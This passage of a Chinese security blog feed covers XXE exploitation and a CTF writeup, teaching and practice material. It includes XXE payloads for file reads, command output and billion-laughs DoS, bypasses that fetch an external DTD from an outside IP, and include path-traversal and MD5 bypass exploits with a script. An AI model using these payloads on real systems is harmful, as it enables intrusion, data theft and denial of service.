class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Response:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;no results for description uid=0(root) gid=0(root) groups=0(root)...</span><br></code></pre></td></tr></table></figure><p>eg :</p><p><img src="https://s2.ax1x.com/2020/02/13/1Oc9MV.png" alt="1Oc9MV.png"></p><p><img src="https://s2.ax1x.com/2020/02/13/1OcCrT.png" alt="1OcCrT.png"></p><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p><a href="https://www.freebuf.com/vuls/194112.html#DOS%E6%94%BB%E5%87%BB">XML DOS攻击</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">lolz</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol</span> <span class="hljs-string">&quot;lol&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol2</span> <span class="hljs-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol3</span> <span class="hljs-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol4</span> <span class="hljs-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol5</span> <span class="hljs-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol6</span> <span class="hljs-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol7</span> <span class="hljs-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol8</span> <span class="hljs-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol9</span> <span class="hljs-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</p><p>或者，如果目标是UNIX系统</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用 &#x2F;dev&#x2F;random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>参考 <a href="http://www.cl4y.top/xxe%E7%AC%94%E8%AE%B0/#toc-head-6">cl4y的blog</a> </p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>利用正则匹配的不严格，大小写绕过。</p><h2 id="html实体编码绕过"><a href="#html实体编码绕过" class="headerlink" title="html实体编码绕过"></a>html实体编码绕过</h2><p>如果过滤了http等协议，可以利用实体编码绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-string">&quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;</span>&gt;</span> </span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;hhh;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="data-x2F-x2F-协议绕过"><a href="#data-x2F-x2F-协议绕过" class="headerlink" title="data:&#x2F;&#x2F;协议绕过"></a>data:&#x2F;&#x2F;协议绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;hhh;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-comment">&lt;!--编码内容--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="file-x2F-x2F-协议加文件上传"><a href="#file-x2F-x2F-协议加文件上传" class="headerlink" title="file:&#x2F;&#x2F;协议加文件上传"></a>file:&#x2F;&#x2F;协议加文件上传</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-comment">&lt;!--上传文件--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="php-x2F-x2F-filter协议加文件上传"><a href="#php-x2F-x2F-filter协议加文件上传" class="headerlink" title="php:&#x2F;&#x2F;filter协议加文件上传"></a>php:&#x2F;&#x2F;filter协议加文件上传</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hhh;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br> <br><span class="hljs-comment">&lt;!--上传文件--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hhh</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hhh;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-comment">&lt;!--上传文件--&gt;</span><br>PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==<br></code></pre></td></tr></table></figure><p>更加深入的可参考 <a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41#wechat_redirect">XXE 拓展</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp</title>
    <link href="/2020/02/08/wust_funnyctf_WriteUp/"/>
    <url>/2020/02/08/wust_funnyctf_WriteUp/</url>
    
    <content type="html"><![CDATA[<h1 id="Wust闲得蛋疼春节瞎欢乐赛-官方WriteUp"><a href="#Wust闲得蛋疼春节瞎欢乐赛-官方WriteUp" class="headerlink" title="Wust闲得蛋疼春节瞎欢乐赛 官方WriteUp"></a>Wust闲得蛋疼春节瞎欢乐赛 官方WriteUp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为疫情的原因，大家在家闲着(大家内心：并不)也是闲着，不如就搭建一个平台，找一些签到题来训练一下新人，至少让新人知道比赛的流程还有一些注意事项，一些基本的操作等，题目来源于各种开源代码，包括南邮的校赛和suctf的题目。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>顾名思义，就是Web的签到题，但我没有想到比隔壁稍微复杂一点的签到题更少人解出来，有点出乎意料。以后这种就不能丢。</p><p>题目描述是：去百度签个到吧。这题来源于<code>NCTF2018</code>的签到题，打开题目链接，就是百度，但是我们注意到地址栏上面的是 <code>/secret.php</code>，按理说应该是 <code>index.php</code> 或者后面为空，这就心生怀疑，于是打开 <code>Burpsuite</code> 等抓包工具一步一步来，这里为了简便我直接用浏览器的<code>f12</code>，这个方法更简单更快。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD1r4.png" alt="1RD1r4.png"></p><p>我们鼠标放在题目链接的时候细心可以注意到链接是 <code>www.cohacker.cn:5011</code>，但是我们打开的界面是 <code>/secret.php</code>，这就有点不对劲。打开<code>f12</code>，访问 <code>www.cohacker.cn:5011</code> ，可以看到有一个 <code>302</code> 跳转，查看头就可以找到 <code>flag</code> 了。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDGZ9.png" alt="1RDGZ9.png"></p><p>因为有个跳转，所以大家可能抓的时候没留意，并且要看 <code>Response</code> 头部，可能都看 <code>secret.php</code> 的头部去了。</p><h3 id="Crossover"><a href="#Crossover" class="headerlink" title="Crossover"></a>Crossover</h3><p>这题是 <code>HCTF2018</code> 的签到题(又是签到题)，主要考点是 <code>include()</code> 文件包含的漏洞和目录穿越，打开题目又是熟悉的滑稽，常规操作查看源代码。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDK2T.png" alt="1RDK2T.png"></p><p>发现有 <code>source.php</code>，访问可得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>REQUSET </code> 时需要传参 <code>file</code> ，并且需要是字符串，同时要过 <code>checkFile</code> 的函数检测，分析代码我们可以看到白名单，只能传 <code>source.php</code> 和 <code>hint.php</code>。可以利用<code>?</code>截取<code>hint.php</code>，然后利用<code>/</code>使<code>hint.php?</code>成为一个不存在的目录，最后<code>include</code>利用<code>../../</code>跳转目录读取flag。访问<code>hint.php</code>得到 <code>flag not here, and flag in ffffllllaaaagggg</code>，于是构造payload：<code>http://49.235.15.37:8081/index.php?file=hint.php?/../../../../../../../../../ffffllllaaaagggg</code> 得到flag。</p><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><p>点击链接，直接就可以看见源码，对源码进行一波分析：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDJaR.png" alt="1RDJaR.png"></p><p>通过分析，大致可以了解到这里需要传入参数 <code>value</code>，满足与<code>whoami</code>的值相同要满足10次，且要绕过md5函数</p><p>所以这里value传入数组，用来绕过MD5函数(当然爆破出符合的md5也行)。且开始时<code>whoami</code>里面的值为‘ea’，所以构造如下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDYI1.png" alt="1RDYI1.png"></p><p>（此时发现页面的开头又回显出两个新的字母，然后将ea改为这两个字母）</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDNPx.png" alt="1RDNPx.png"></p><p>再次构造<code>url</code>为：<code>?value[]=qk</code> (注意，每个人回显的都不一样，在2分钟内重复这样的操作10次就能拿到flag</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDdxO.png" alt="1RDdxO.png"></p><p>写脚本也是很快的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-string">&#x27;&#x27;&#x27; # 这是爆破md5的方法，这里也可以不用</span><br><span class="hljs-string">def get_value(given):</span><br><span class="hljs-string">global dict_az</span><br><span class="hljs-string">for i in range(1000000):</span><br><span class="hljs-string">result = given</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">result += random.choice(dict_az)</span><br><span class="hljs-string">m = hashlib.md5(result)</span><br><span class="hljs-string">m = m.hexdigest()</span><br><span class="hljs-string">if m[5:9] == &quot;0000&quot;:</span><br><span class="hljs-string">print(&quot;success&quot;)</span><br><span class="hljs-string">print(m)</span><br><span class="hljs-string">return result</span><br><span class="hljs-string">else:</span><br><span class="hljs-string">pass</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url_s</span>):<br>session = requests.Session()<br>result = <span class="hljs-string">&quot;ea&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>url = url_s<br>resp = session.get(url+result)<br>the_page = resp.text<br><span class="hljs-comment"># result = get_value(the_page[0:2])</span><br>result = the_page[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nums = %d&quot;</span> % i)<br>index_1 = the_page.find(<span class="hljs-string">&quot;wctf&quot;</span>)<br>index_2 = the_page.find(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(the_page[index_1:index_2+<span class="hljs-number">1</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>dict_az = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>url = <span class="hljs-string">&quot;http://www.cohacker.cn:23123/challenge13.php?value[]=&quot;</span><br>main(url)<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/08/1RDOzT.png" alt="1RDOzT.png"></p><h3 id="男人就要快："><a href="#男人就要快：" class="headerlink" title="男人就要快："></a>男人就要快：</h3><p>进入链接，看到页面：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDBse.png" alt="1RDBse.png"></p><p>（英语不好的，直接放百度翻译翻译一下）</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDydA.png" alt="1RDydA.png"></p><p>大致意思呢就是提交’true’或者’false’，判断页面的那个式子是否正确，需要连续判断20次，且每一次都要判断正确（这里有个小坑就是，不是让你提交最后的结果，而是提交true或者false），还有一个小坑就是需要在1-2s内提交（注意，提交需要超过一秒，但是不能慢于两秒）</p><p>所以，这里是用Python脚本来处理（需要了解的模块，<code>request</code>， <code>re</code>或者<code>BeautifulSoup</code>，<code>time</code>模块）</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD2JP.png" alt="1RD2JP.png"></p><p>20s之后，就可以拿到flag</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDRRf.png" alt="1RDRRf.png"></p><h3 id="你太闲了"><a href="#你太闲了" class="headerlink" title="你太闲了"></a>你太闲了</h3><p><img src="https://s2.ax1x.com/2020/02/08/1RDWz8.png" alt="1RDWz8.png"></p><p>一开始就这样一个界面，我们去看一下前端的代码：<img src="https://s2.ax1x.com/2020/02/08/1RDhQS.png" alt="1RDhQS.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RD4sg.png" alt="1RD4sg.png"></p><p>我们页面随便输一下内容</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD5LQ.png" alt="1RD5LQ.png"></p><p>发现它将 <code>UserName</code> 的内容输出到页面上，跟XML有关的漏洞，我们这里尝试使用XXE（外部实体注入）漏洞—OWASP TOP 10 漏洞之一</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD7on.png" alt="1RD7on.png"></p><p>根据提示，flag放在&#x2F;flag里面，我们读取一下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDjQU.png" alt="1RDjQU.png"></p><p>然后就得到flag了</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDvyF.png" alt="1RDvyF.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RH0lF.png" alt="1RH0lF.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这次的密码学题目主要目的就是把一些奇淫技巧都让新人见识一下，因此抽取了一些比较无脑的题目，直接在线跑就可以。</p><h3 id="你是猪吗"><a href="#你是猪吗" class="headerlink" title="你是猪吗"></a>你是猪吗</h3><p>题目说得很明显了，跟猪有关，不难想到是猪圈密码，百度找到猪圈密码，对应把 flag 拼出来就可以，这里 flag 设置了大小写不敏感，也算是降低了难度，送分题。</p><p><a 